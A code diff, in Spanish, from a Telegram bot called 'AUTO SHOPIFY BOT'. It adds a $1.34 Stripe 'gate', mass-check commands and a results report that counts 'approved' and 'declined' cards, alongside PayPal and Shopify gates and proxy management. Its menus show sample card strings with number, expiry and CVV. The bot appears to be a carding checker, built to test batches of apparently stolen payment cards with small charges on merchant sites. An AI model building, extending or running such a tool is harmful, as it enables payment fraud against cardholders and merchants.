+        if delay > 0 and i < total_tarjetas:
+            time.sleep(delay)
+    
+    # Generar archivo de resultados
+    tiempo_total = time.time() - start_time
+    minutos = int(tiempo_total // 60)
+    segundos = int(tiempo_total % 60)
+    
+    filename = f"resultados_shopify_{task_id}.txt"
+    with open(filename, 'w', encoding='utf-8') as f:
+        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Total tarjetas: {total_tarjetas}\n")
+        f.write(f"Sitios usados: {total_sitios}\n")
+        f.write(f"Tiempo: {minutos}m {segundos}s\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+        f.write(f"✅ Aprobadas: {resultados['success']}\n")
+        f.write(f"❌ Declinadas: {resultados['failed']}\n")
+        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
+        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
+        for d in detalles:
+            f.write(f"{d}\n")
+    
+    # Mensaje final
+    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
+━━━━━━━━━━━━━━━━━━━━━━
+📊 RESULTADOS:
+✅ Aprobadas: {resultados['success']}
+❌ Declinadas: {resultados['failed']}
+⚠️ Errores: {resultados['error']}
+⏱️ Tiempo: {minutos}m {segundos}s
+
+📁 Se generó archivo con detalles"""
+    
+    try:
+        bot.edit_message_text(texto_final, chat_id, msg.message_id)
+    except:
+        bot.send_message(chat_id, texto_final)
+    
+    # Enviar archivo
+    with open(filename, 'rb') as f:
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
+    
+    os.remove(filename)
+    
+    time.sleep(300)
+    if task_id in active_tasks:
+        del active_tasks[task_id]
+
 # ==================== CALLBACKS PARA BOTONES ====================
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -1961,6 +2249,20 @@ def callback_handler(call):
             reply_markup=menu_paypal()
         )
     
+    elif call.data == 'menu_stripe':
+        bot.send_message(
+            call.message.chat.id,
+            "💳 *STRIPE $1.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
+            parse_mode='Markdown'
+        )
+    
+    elif call.data == 'menu_stripe_134':
+        bot.send_message(
+            call.message.chat.id,
+            "💳 *STRIPE $1.34 (GATE 2)*\n\nUsa: `/check134 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check134 4169161481963022|09|2029|859`\n\nMasivo: `/mass134`",
+            parse_mode='Markdown'
+        )
+    
     elif call.data == 'menu_shopify':
         bot.edit_message_text(
             "🛍️ *GESTIÓN DE SITIOS SHOPIFY*\n\nSelecciona una opción:",
@@ -1988,13 +2290,6 @@ def callback_handler(call):
         bot.send_message(
             call.message.chat.id,
             "💎 *PAYPAL $1.00*\n\nUsa: `/pp3 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp3 377481019318036|06|2029|1937`",
-            parse_mode='Markdown'
-        )
-    
-    elif call.data == 'menu_stripe':
-        bot.send_message(
-            call.message.chat.id,
-            "💳 *STRIPE $1.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
             parse_mode='Markdown'
         )
     
@@ -2398,19 +2693,21 @@ def default(message):
 
 if __name__ == "__main__":
     print("="*80)
-    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON 3 GATES")
+    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON 4 GATES")
     print("="*80)
     print("✅ Gates disponibles:")
     print("   • Stripe: $1.00       → /check")
+    print("   • Stripe: $1.34       → /check134 (NUEVO)")
     print("   • PayPal: $10         → /pp")
     print("   • PayPal: $0.10       → /pp2")
     print("   • PayPal: $1          → /pp3")
     print("   • AutoShopify: variable → /sh")
     print("="*80)
     print("✅ Comandos masivos:")
-    print("   • Stripe masivo  → /mass")
-    print("   • PayPal masivo  → /mpp")
-    print("   • Shopify masivo → /msh")
+    print("   • Stripe $1 masivo   → /mass")
+    print("   • Stripe $1.34 masivo → /mass134")
+    print("   • PayPal masivo      → /mpp")
+    print("   • Shopify masivo     → /msh")
     print("="*80)
     print("✅ Proxies y Sitios:")
     print("   • /addproxy, /proxies, /px, /delallproxy")
